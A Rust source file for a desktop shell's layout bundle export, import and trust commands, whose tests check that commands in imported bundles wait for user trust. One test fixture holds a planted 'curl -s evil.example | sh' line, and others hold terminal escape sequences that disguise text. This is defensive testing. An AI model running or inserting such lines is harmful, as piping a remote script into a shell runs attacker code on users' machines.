//! `hogar-shell layout export|import|trust` — a layout shared as a bundle, and what an imported one may run (DEC-30).
//!
//! `export` reads the files and answers in the CLI process, like `layout show`: it writes nothing the shell owns, and a bundle is worth making from a layout whether or not a shell is drawing it. `import` and `trust` go to the shell, which owns the store an import writes into and the trust resolution reads. An import is read on the shell's import worker, off the driver thread, and its reply waits for the outcome — what was written and what waits for trust — with the trust dialog open where there is something to answer; only where nobody waits for that reply is the outcome a notice.
//!
//! Every text a bundle runs is printed with what could disguise it written out ([`util::text::shown`]), and is answered by an id that is a hash of all of it, or all at once by the hash of the list printed, so an answer is always for what was shown.

use std::path::{Path, PathBuf};
use std::time::Duration;

use layout::bundle;
use layout::{BUILT_IN, Item, LayoutId, LayoutStore, Trust, Verdict};
use surfaces::bundles::{self, Bundled, Imported, Importing};
use surfaces::layouts;
use surfaces::trust_dialog;
use util::report::Report;

use super::layout::{catalogue, current_config};

/// Writes the layout named, or the one being drawn, to a new bundle directory at `args[0]`.
pub(super) fn export(args: &[&str]) -> Result<String, String> {
    let to = Path::new(args.first().ok_or("missing argument <bundle-path>")?);
    let id = match args.get(1) {
        Some(name) => LayoutId::new(name),
        None => LayoutId::new(
            services::state::get()
                .layout
                .unwrap_or_else(|| BUILT_IN.to_string()),
        ),
    };
    let (store, _) = LayoutStore::load(layouts::dir());
    let made = bundle::export(&id, store.all()).map_err(|report| report.render())?;
    made.write(to).map_err(|report| report.render())?;
    let trust = Trust::with_rule(super::runs_unasked);
    let runs: usize = made
        .layouts
        .values()
        .map(|it| layout::layout_items(it, &trust).len())
        .sum::<usize>()
        + made
            .komponents
            .iter()
            .map(|(id, komponent)| layout::komponent_items(id, komponent, &trust).len())
            .sum::<usize>();
    let mut said = format!(
        "wrote the bundle `{}` to {}: {}",
        made.manifest.name,
        to.display(),
        made.files().collect::<Vec<_>>().join(", ")
    );
    if !made.assets.is_empty() {
        said.push_str(&format!("; {} picture(s)", made.assets.len()));
    }
    if runs > 0 {
        said.push_str(&format!(
            "\nit runs {runs} command(s), address(es) or action(s), which whoever imports it is asked to trust one by one"
        ));
    }
    Ok(said)
}

/// How long `layout import` waits for the import worker before answering that the import goes on and a notice will say how it went. What a bundle may hold is bounded (`layout::bundle`) — a megabyte a file, 256 MiB of pictures together — so a wait this long is a stalled disk, not a large bundle.
const IMPORT_WAIT: Duration = Duration::from_secs(60);

/// Imports the bundle at `args[0]`, which the client has made absolute, and says what it wrote and lists what it runs. In the shell the bundle is read on the import worker while the client waits for the answer ([`services::command::defer`]); where nobody waits for one — an action line — the answer is a notice.
pub(super) fn import(args: &[&str]) -> Result<String, String> {
    let from = PathBuf::from(args.first().ok_or("missing argument <bundle-path>")?);
    let started =
        bundles::import(&from, &catalogue(), &current_config()).map_err(|why| why.english())?;
    match started {
        Importing::Done(done) => imported(&from, &done),
        Importing::Reading(reading) => {
            let reading_now = format!(
                "reading the bundle at {}: a notice says how the import went, and `hogar-shell layout trust` lists what it runs",
                from.display()
            );
            if let Some(later) = services::command::defer(IMPORT_WAIT) {
                reading.answer_with(move |outcome| {
                    later.answer(super::rendered(imported(&from, outcome)))
                });
            }
            Ok(reading_now)
        }
    }
}

/// What an import of the bundle at `from` did, as `layout import` says it: the files it wrote, where its pictures went, each item it runs that waits for trust and how to answer for them, and whether the trust dialog opened for them.
fn imported(from: &Path, outcome: &Result<Imported, Report>) -> Result<String, String> {
    let imported = outcome.as_ref().map_err(|report| report.render())?;
    let name = &imported.manifest.name;
    let mut lines = vec![format!(
        "imported the bundle `{name}` from {}: {}",
        from.display(),
        imported.files.join(", ")
    )];
    if imported.assets > 0 {
        lines.push(format!(
            "its {} picture(s) are in {}",
            imported.assets,
            bundles::assets_dir(name).display()
        ));
    }
    let waiting = imported
        .items
        .iter()
        .filter(|(_, verdict)| *verdict == Verdict::Pending)
        .count();
    match waiting {
        0 => lines.push("it runs nothing that waits for your trust".to_string()),
        n => {
            lines.push(format!(
                "{n} item(s) it runs stay off until you trust them:"
            ));
            lines.extend(
                imported
                    .items
                    .iter()
                    .map(|(item, verdict)| listed(item, *verdict)),
            );
            let all: Vec<Item> = imported
                .items
                .iter()
                .map(|(item, _)| item.clone())
                .collect();
            lines.push(how_to_answer(name, &all));
            lines.push(match bundles::open_dialog_once() {
                Some(Ok(_)) => {
                    "the trust dialog is open on the focused screen to answer them".to_string()
                }
                Some(Err(why)) => format!("the trust dialog did not open: {}", why.english()),
                None => "the trust dialog was opened for an import moments ago".to_string(),
            });
        }
    }
    if !imported.warnings.is_clean() {
        lines.push(imported.warnings.render().trim_end().to_string());
    }
    Ok(lines.join("\n"))
}

/// Lists the bundles, or what one runs; answers for one item of it by its id, or for everything it lists by the id of that list (`--all <set>`); or opens the dialog that answers for what waits.
pub(super) fn trust(args: &[&str]) -> Result<String, String> {
    if args.contains(&"--dialog") {
        if args.len() > 1 {
            return Err("`--dialog` takes nothing else: the dialog lists every bundle".to_string());
        }
        let count = trust_dialog::open().map_err(|why| why.english())?;
        return Ok(format!(
            "the trust dialog is open on the focused screen with {count} item(s) waiting"
        ));
    }
    let decline = args.contains(&"--decline");
    let all = args.contains(&"--all");
    let words: Vec<&str> = args
        .iter()
        .copied()
        .filter(|word| !matches!(*word, "--decline" | "--all"))
        .collect();
    let listed_bundles = bundles::bundles().map_err(|why| why.english())?;
    let Some(bundle) = words.first().copied() else {
        if decline || all {
            return Err(
                "say which bundle: `hogar-shell layout trust <bundle> <item|--all <set>>`"
                    .to_string(),
            );
        }
        return Ok(overview(&listed_bundles));
    };
    if words.len() > 2 {
        return Err(format!("expected one item, got `{}`", words[1..].join(" ")));
    }
    let Some(named) = words.get(1).copied() else {
        if decline || all {
            return Err(format!(
                "say what to answer for: an item's id, or `--all <set>` with the set `hogar-shell layout trust {bundle}` prints"
            ));
        }
        let found = bundles::named(bundle, &listed_bundles).map_err(|why| why.english())?;
        return Ok(items_of(found));
    };
    let answered = match all {
        false => bundles::answer_id(bundle, named, !decline),
        true => bundles::answer_set(bundle, named, !decline),
    }
    .map_err(|why| why.english())?;
    let verdict = match decline {
        false => Verdict::Accepted,
        true => Verdict::Declined,
    };
    let mut lines = vec![format!(
        "{} {} item(s) of `{bundle}`:",
        verdict.as_str(),
        answered.len()
    )];
    lines.extend(answered.iter().map(|item| listed(item, verdict)));
    Ok(lines.join("\n"))
}

fn overview(listed: &[Bundled]) -> String {
    if listed.is_empty() {
        return "no bundle has been imported".to_string();
    }
    listed
        .iter()
        .map(|bundle| {
            let count = |want: Verdict| {
                bundle
                    .items
                    .iter()
                    .filter(|(_, verdict)| *verdict == want)
                    .count()
            };
            format!(
                "{}\t{} pending, {} accepted, {} declined",
                bundle.name,
                count(Verdict::Pending),
                count(Verdict::Accepted),
                count(Verdict::Declined)
            )
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn items_of(bundle: &Bundled) -> String {
    if bundle.items.is_empty() {
        return format!("the bundle `{}` runs nothing", bundle.name);
    }
    let mut lines: Vec<String> = bundle
        .items
        .iter()
        .map(|(item, verdict)| listed(item, *verdict))
        .collect();
    lines.push(how_to_answer(&bundle.name, &bundle.all()));
    lines.join("\n")
}

/// One item as the command line lists it: its id, where it stands, what kind it is and where it is written, then its text, each with whatever could disguise it written out.
fn listed(item: &Item, verdict: Verdict) -> String {
    let lock = match item.lock_safe {
        true => "  (says lock_safe: shown on the lock screen once accepted)",
        false => "",
    };
    format!(
        "  {}  {:<8}  {:<6}  {} {}\n      {}{lock}",
        item.id(),
        verdict.as_str(),
        item.kind.as_str(),
        util::text::shown(&item.file),
        util::text::shown(&item.key),
        item.shown()
    )
}

/// How to answer for what was just listed: one item by its id, or exactly the listed items by the id of the list.
fn how_to_answer(bundle: &str, listed: &[Item]) -> String {
    format!(
        "accept one with `hogar-shell layout trust {bundle} <id>`, or everything listed with `hogar-shell layout trust {bundle} --all {}`; add `--decline` to refuse instead",
        layout::set_of(listed)
    )
}

#[cfg(test)]
mod tests {
    use std::cell::RefCell;
    use std::rc::Rc;

    use layout::{Action, Trigger};

    use super::*;
    use crate::core::commands::{dispatch, dispatch_words};

    /// A layout of the user's, as `layout export` reads it from the layouts directory: the built-in one with a command source and a `shell run` on the bar.
    fn shared(name: &str) -> layout::Layout {
        let mut layout = layout::built_in();
        layout.id = LayoutId::new(name);
        layout.sources =
            toml::from_str("[forecast]\nkind = 'poll'\ncmd = 'curl -s wttr.in'\nevery = '5m'\n")
                .expect("the sources parse");
        let bar = layout.outputs[0]
            .layers
            .top
            .areas
            .iter_mut()
            .find(|area| area.id.as_str() == "bar-top")
            .expect("the built-in bar");
        bar.actions.insert(
            Trigger::Press,
            Action(vec!["shell run notify-send hi".to_string()]),
        );
        layout
    }

    fn fresh_shell(test: &str) -> Rc<RefCell<LayoutStore>> {
        ui::descriptor::install(crate::core::modules::MODULES);
        let dir = util::paths::isolated_root()
            .expect("a test process resolves under its scratch root")
            .join(format!("bundle-verbs-{test}"))
            .join("layouts");
        let _ = std::fs::remove_dir_all(dir.parent().unwrap());
        std::fs::create_dir_all(&dir).expect("a layouts directory");
        let (mut store, report) = LayoutStore::load(&dir);
        assert!(report.is_clean(), "{}", report.render());
        store.set_trust(bundles::trust_of(
            &services::state::get(),
            crate::core::commands::runs_unasked,
        ));
        let store = Rc::new(RefCell::new(store));
        layouts::install(Rc::clone(&store), Rc::new(|| {}));
        store
    }

    fn listed_items(name: &str) -> Vec<Item> {
        bundles::bundles()
            .unwrap()
            .into_iter()
            .find(|bundle| bundle.name == name)
            .unwrap()
            .all()
    }

    fn ok(reply: String) -> String {
        reply
            .strip_prefix("ok ")
            .unwrap_or_else(|| panic!("refused: {reply}"))
            .to_string()
    }

    /// The verbs end to end: a layout exported to a bundle, imported into another shell's store with everything it runs listed as pending, listed again, accepted, declined, and refused for what is not there.
    #[test]
    fn a_layout_travels_as_a_bundle_and_what_it_runs_waits_for_layout_trust() {
        let name = "bundle-verbs";
        std::fs::create_dir_all(layouts::dir()).unwrap();
        std::fs::write(
            layouts::dir().join(format!("{name}.toml")),
            toml::to_string_pretty(&shared(name)).unwrap(),
        )
        .unwrap();
        let out = util::paths::isolated_root()
            .unwrap()
            .join(format!("{name}-out"));
        let _ = std::fs::remove_dir_all(&out);
        let words = |line: &[&str]| line.iter().map(|it| it.to_string()).collect::<Vec<_>>();

        let exported = ok(dispatch_words(&words(&[
            "layout",
            "export",
            &out.display().to_string(),
            name,
        ])));
        assert!(exported.contains("layouts/bundle-verbs.toml"), "{exported}");
        assert!(exported.contains("2 command(s)"), "{exported}");
        assert!(out.join("manifest.toml").is_file());

        let store = fresh_shell("travel");
        let imported = ok(dispatch_words(&words(&[
            "layout",
            "import",
            &out.display().to_string(),
        ])));
        assert!(
            imported.contains("2 item(s) it runs stay off"),
            "{imported}"
        );
        assert!(imported.contains("curl -s wttr.in"), "{imported}");
        assert!(imported.contains("shell run notify-send hi"), "{imported}");
        assert!(store.borrow().get(&LayoutId::new(name)).is_some());

        assert!(
            ok(dispatch("layout trust"))
                .contains(&format!("{name}\t2 pending, 0 accepted, 0 declined")),
        );
        let listed = ok(dispatch(&format!("layout trust {name}")));
        let forecast = bundles::bundles()
            .unwrap()
            .into_iter()
            .find(|bundle| bundle.name == name)
            .unwrap()
            .items
            .into_iter()
            .find(|(item, _)| item.key == "sources.forecast.cmd")
            .map(|(item, _)| item.id())
            .unwrap();
        assert!(listed.contains(&forecast), "{listed}");

        let accepted = ok(dispatch(&format!("layout trust {name} {forecast}")));
        assert!(accepted.starts_with("accepted 1 item(s)"), "{accepted}");
        assert!(
            ok(dispatch("layout trust"))
                .contains(&format!("{name}\t1 pending, 1 accepted, 0 declined"))
        );
        let set = layout::set_of(&listed_items(name));
        let declined = ok(dispatch(&format!(
            "layout trust {name} --all {set} --decline"
        )));
        assert!(declined.starts_with("declined 2 item(s)"), "{declined}");

        let unknown = dispatch("layout trust no-such-bundle");
        assert!(
            unknown.starts_with("err there is no bundle called `no-such-bundle`"),
            "{unknown}"
        );
        let nothing = dispatch(&format!("layout trust {name} 0000beef"));
        assert!(nothing.starts_with("err the bundle"), "{nothing}");
        assert!(
            dispatch(&format!("layout trust {name} --decline"))
                .starts_with("err say what to answer for")
        );

        let again = dispatch_words(&words(&[
            "layout",
            "export",
            &out.display().to_string(),
            name,
        ]));
        assert!(
            again.starts_with("err"),
            "a bundle is never written over: {again}"
        );
        let _ = std::fs::remove_file(layouts::dir().join(format!("{name}.toml")));
    }

    /// DEC-30's dialog is reached three ways: an import that brings something to answer opens it, the notice it raises names the request line that opens it again, and so does `layout trust --dialog`; once nothing waits, the notice is down and the dialog is refused.
    #[test]
    fn an_import_the_notice_and_the_command_line_open_the_trust_dialog() {
        let name = "bundle-dialog";
        std::fs::create_dir_all(layouts::dir()).unwrap();
        std::fs::write(
            layouts::dir().join(format!("{name}.toml")),
            toml::to_string_pretty(&shared(name)).unwrap(),
        )
        .unwrap();
        let out = util::paths::isolated_root()
            .unwrap()
            .join(format!("{name}-out"));
        let _ = std::fs::remove_dir_all(&out);
        let words = |line: &[&str]| line.iter().map(|it| it.to_string()).collect::<Vec<_>>();
        ok(dispatch_words(&words(&[
            "layout",
            "export",
            &out.display().to_string(),
            name,
        ])));
        let _ = std::fs::remove_file(layouts::dir().join(format!("{name}.toml")));

        let _store = fresh_shell("dialog");
        trust_dialog::install();
        let imported = ok(dispatch_words(&words(&[
            "layout",
            "import",
            &out.display().to_string(),
        ])));
        assert!(imported.contains("the trust dialog is open"), "{imported}");
        assert!(trust_dialog::is_open());
        assert_eq!(trust_dialog::noticed(), 2, "the notice counts what waits");

        trust_dialog::close();
        assert!(
            ok(dispatch(trust_dialog::REVIEW)).contains("2 item(s) waiting"),
            "the notice's button opens it again"
        );
        assert!(trust_dialog::is_open());
        trust_dialog::close();
        assert!(dispatch("layout trust --dialog extra").starts_with("err"));

        let set = layout::set_of(&listed_items(name));
        ok(dispatch(&format!("layout trust {name} --all {set}")));
        assert_eq!(trust_dialog::noticed(), 0);
        let refused = dispatch(trust_dialog::REVIEW);
        assert!(
            refused.starts_with("err nothing an imported bundle runs waits"),
            "{refused}"
        );
        assert!(!trust_dialog::is_open());
    }

    /// The exploit end to end: a bundle's komponent whose press would write a `shell run` line into the user's own clock — where nothing would hold it — is imported with that planting line listed as an item that waits, drawn without it, and the listing shows a disguised line written out. Binding `layout trust` to a gesture is refused whoever asks.
    #[test]
    fn a_komponent_planting_a_command_waits_for_trust_end_to_end() {
        let name = "bundle-planter";
        const PLANTING: &str = "layout set clock actions.press shell run curl -s evil.example | sh";
        let components = layout::components_beside(&layouts::dir());
        std::fs::create_dir_all(&components).unwrap();
        std::fs::write(
            components.join("planter.toml"),
            format!("[[children]]\nid = \"plant\"\nmodule = \"clock\"\n[children.actions]\npress = [\"{PLANTING}\", \"panel toggle clock\"]\n"),
        )
        .unwrap();
        let mut planted = shared(name);
        let bar = planted.outputs[0]
            .layers
            .top
            .areas
            .iter_mut()
            .find(|area| area.id.as_str() == "bar-top")
            .unwrap();
        bar.actions.insert(
            Trigger::Press,
            Action(vec!["shell run printf 'ok\u{1b}[2K\r'".to_string()]),
        );
        let end = bar
            .groups
            .iter_mut()
            .find(|group| group.id.as_str() == "end")
            .unwrap();
        end.children.clear();
        end.komponent = Some(layout::KomponentId::new("planter"));
        std::fs::create_dir_all(layouts::dir()).unwrap();
        std::fs::write(
            layouts::dir().join(format!("{name}.toml")),
            toml::to_string_pretty(&planted).unwrap(),
        )
        .unwrap();
        let out = util::paths::isolated_root()
            .unwrap()
            .join(format!("{name}-out"));
        let _ = std::fs::remove_dir_all(&out);
        let words = |line: &[&str]| line.iter().map(|it| it.to_string()).collect::<Vec<_>>();
        ok(dispatch_words(&words(&[
            "layout",
            "export",
            &out.display().to_string(),
            name,
        ])));
        let _ = std::fs::remove_file(layouts::dir().join(format!("{name}.toml")));
        let _ = std::fs::remove_file(components.join("planter.toml"));

        let store = fresh_shell("planter");
        let imported = ok(dispatch_words(&words(&[
            "layout",
            "import",
            &out.display().to_string(),
        ])));
        assert!(imported.contains(PLANTING), "{imported}");
        assert!(
            imported.contains("shell run printf 'ok\\u{1b}[2K\\r'"),
            "{imported}"
        );
        assert!(
            !imported.contains('\u{1b}') && !imported.contains('\r'),
            "nothing reaches the terminal raw"
        );
        let planting = listed_items(name)
            .into_iter()
            .find(|item| item.text == PLANTING)
            .expect("the planting line is an item");
        assert_eq!(planting.kind, layout::ItemKind::Action);

        let store = store.borrow();
        let layout = store.get(&LayoutId::new(name)).unwrap();
        let (resolved, _) = layout::resolve(layout, store.all(), layout::NOMINAL_OUTPUT, None);
        let plant = resolved
            .instances()
            .find(|instance| instance.id.as_str() == "bar-top.end/plant")
            .expect("the komponent's child is drawn");
        assert_eq!(
            plant.actions[&Trigger::Press].0,
            ["panel toggle clock"],
            "drawn without the planting line"
        );
        drop(store);
        let refused =
            dispatch("layout set clock actions.press layout trust bundle-planter --all 0");
        assert!(refused.starts_with("err "), "{refused}");
    }

    /// A warning an import prints quotes what the bundle wrote, which reaches a terminal written out: no escape it holds can repaint the screen, wherever in the finding it sits.
    #[test]
    fn a_warning_quoting_bundle_text_is_printed_written_out() {
        let mut warnings = Report::default();
        warnings.warn(util::report::Finding::new(
            "layouts/x.toml",
            "outputs.*.layers.top.areas.bar\u{1b}[2J.actions.press",
            layout::StoreError::GrantsTrust {
                key: "actions.press".to_string(),
                line: "layout trust x\u{1b}]0;owned\u{7}".to_string(),
            }
            .message(),
        ));
        let done = Imported {
            manifest: layout::bundle::Manifest {
                name: "x".to_string(),
                description: None,
                author: None,
            },
            files: vec!["layouts/x.toml".to_string()],
            assets: 0,
            items: Vec::new(),
            warnings,
        };
        let said = imported(Path::new("/tmp/x"), &Ok(done)).expect("it imported");
        assert!(
            !said.contains('\u{1b}') && !said.contains('\u{7}'),
            "{said}"
        );
        assert!(said.contains("bar\\u{1b}[2J.actions.press"), "{said}");
        assert!(
            said.contains("layout trust x\\u{1b}]0;owned\\u{7}"),
            "{said}"
        );
    }
}
